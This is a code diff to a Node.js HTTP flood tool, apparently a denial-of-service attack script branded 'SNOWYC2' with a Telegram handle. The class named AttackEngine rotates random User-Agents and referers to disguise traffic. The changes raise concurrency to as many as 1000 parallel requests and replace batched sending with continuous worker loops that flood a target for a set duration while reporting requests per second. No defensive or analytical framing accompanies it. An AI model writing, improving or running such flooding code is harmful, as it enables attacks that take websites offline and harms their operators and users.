@@ -5,7 +5,7 @@ const http = require('http');
 const https = require('https');
 const process = require('process');
 
-const MAX_CONCURRENT = Math.min(os.cpus().length * 75, 600);
+const MAX_CONCURRENT = Math.min(os.cpus().length * 100, 1000); // tweak this if needed
 const REQUEST_TIMEOUT = 8000;
 
 function loadLines(filename) {
@@ -22,7 +22,6 @@ function loadLines(filename) {
 const REFERERS = loadLines('refs.txt');
 const USER_AGENTS = loadLines('ua.txt');
 
-// Pre-generate shuffled User-Agent pool
 const UA_POOL = Array.from({ length: 10000 }, () =>
     USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0');
 
@@ -41,6 +40,7 @@ class AttackEngine {
             peakRps: 0
         };
         this.uaIndex = 0;
+        this.running = true;
     }
 
     getRandomUA() {
@@ -49,9 +49,7 @@ class AttackEngine {
     }
 
     getRandomReferer() {
-        return REFERERS.length > 0
-            ? REFERERS[Math.floor(Math.random() * REFERERS.length)]
-            : 'https://google.com';
+        return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
     }
 
     async makeRequest() {
@@ -69,14 +67,33 @@ class AttackEngine {
                 httpAgent: keepAliveHttp,
                 httpsAgent: keepAliveHttps
             });
-            return response.status === 200 ? 'SUCCESS' : 'ERROR';
+            if (response.status === 200) {
+                this.stats.success++;
+                return;
+            }
         } catch {
-            return 'ERROR';
+            // ignore
+        }
+        this.stats.errors++;
+    }
+
+    async startWorkers() {
+        const workers = [];
+        for (let i = 0; i < MAX_CONCURRENT; i++) {
+            workers.push(this.workerLoop());
+        }
+        await Promise.all(workers);
+    }
+
+    async workerLoop() {
+        while (this.running && Date.now() - this.startTime < this.duration) {
+            this.stats.total++;
+            await this.makeRequest();
         }
     }
 
     async runAttack() {
-        const fancyStart = () => {
+        const showIntro = () => {
             console.clear();
             console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
             console.log('  ============================================');
@@ -86,54 +103,23 @@ class AttackEngine {
             console.log('  ============================================\n');
         };
 
-        fancyStart();
+        showIntro();
 
-        const rpsInterval = setInterval(() => {
+        let lastTotal = 0;
+        const printStats = setInterval(() => {
             const elapsed = (Date.now() - this.startTime) / 1000;
-            const rps = this.stats.total / elapsed;
-            this.stats.peakRps = Math.max(this.stats.peakRps, rps);
+            const currentRps = (this.stats.total - lastTotal) / 0.2;
+            lastTotal = this.stats.total;
+            this.stats.peakRps = Math.max(this.stats.peakRps, currentRps);
 
             process.stdout.write(
-                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${rps.toFixed(1)} `
+                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${currentRps.toFixed(1)} `
             );
-        }, 1000);
+        }, 200);
 
-        // Custom concurrency manager (without p-limit)
-        const executeConcurrently = async (tasks) => {
-            const results = [];
-            const executing = [];
-            for (const task of tasks) {
-                const promise = task().then(result => results.push(result)).catch(() => {});
-                executing.push(promise);
-                if (executing.length >= MAX_CONCURRENT) {
-                    await Promise.race(executing);
-                    executing.filter(p => p !== promise);
-                }
-            }
-            await Promise.all(executing);
-            return results;
-        };
-
-        while (Date.now() - this.startTime < this.duration) {
-            const tasks = Array.from({ length: MAX_CONCURRENT }, () =>
-                () => this.makeRequest()
-            );
-
-            const results = await executeConcurrently(tasks);
-
-            for (const res of results) {
-                this.stats.total++;
-                if (res === 'SUCCESS') {
-                    this.stats.success++;
-                } else {
-                    this.stats.errors++;
-                }
-            }
-
-            await new Promise(r => setTimeout(r, 100)); // Sleep for a bit to avoid hitting max connection limits
-        }
-
-        clearInterval(rpsInterval);
+        await this.startWorkers();
+        this.running = false;
+        clearInterval(printStats);
         this.printSummary();
     }
 
